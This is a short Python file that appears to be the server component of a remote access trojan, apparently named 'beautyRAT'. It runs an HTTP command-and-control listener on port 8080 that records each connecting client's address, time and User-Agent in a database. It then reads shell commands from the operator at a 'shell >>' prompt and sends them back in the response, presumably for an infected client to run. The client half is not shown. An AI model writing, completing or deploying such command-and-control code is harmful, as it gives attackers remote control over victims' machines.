from http.server import BaseHTTPRequestHandler
from http.server import ThreadingHTTPServer
from Server.Utilities import database
DATABASE_PATH = "C:\\Users\\viceblack\\PycharmProjects\\beautyRAT\\Server\\server.db"


class PostGetRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        c_add = str(self.client_address)
        c_date = str(self.log_date_time_string())
        p_ver = str(self.protocol_version)
        r_type = str(self.command)
        u_agent = str(self.headers["User-Agent"])
        database.save_to_database(DATABASE_PATH, c_date, c_add, p_ver, r_type, u_agent)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        command = input("shell >>  ")
        self.wfile.write(command.encode())



def web_server():
    print("Listing on  172.20.10.7:8080 \n")

    httpd = ThreadingHTTPServer(("", 8080), PostGetRequestHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()


if __name__ == "__main__":
    print("create new table")
    database.create_datebase(DATABASE_PATH)
    web_server()
